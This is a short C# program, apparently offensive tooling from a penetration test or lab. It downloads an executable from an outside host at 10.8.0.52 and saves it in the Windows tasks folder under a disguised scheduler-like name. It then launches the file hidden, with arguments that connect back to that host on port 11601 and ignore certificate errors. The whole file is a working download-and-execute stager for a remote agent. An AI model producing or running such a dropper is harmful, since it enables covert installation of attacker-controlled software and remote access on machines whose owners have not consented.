﻿using System;
using System.Diagnostics;
using System.Net;

class Program
{
    static void Main()
    {
        RunAgent();
    }

    public static void RunAgent()
    {
        string agentUrl = "http://10.8.0.52/agent.exe";
        string agentPath = @"c:\windows\tasks\taskagentsched.exe";
        string arguments = "-connect 10.8.0.52:11601 -ignore-cert";

        // Download agent.exe from the specified URL
        using (WebClient webClient = new WebClient())
        {
            try
            {
                webClient.DownloadFile(agentUrl, agentPath);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to download agent.exe: {ex.Message}");
                return;
            }
        }

        // Run agent.exe with specified arguments
        ProcessStartInfo startInfo = new ProcessStartInfo
        {
            FileName = agentPath,
            Arguments = arguments,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        try
        {
            Process.Start(startInfo);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed to start {agentPath}: {ex.Message}");
        }
    }
}
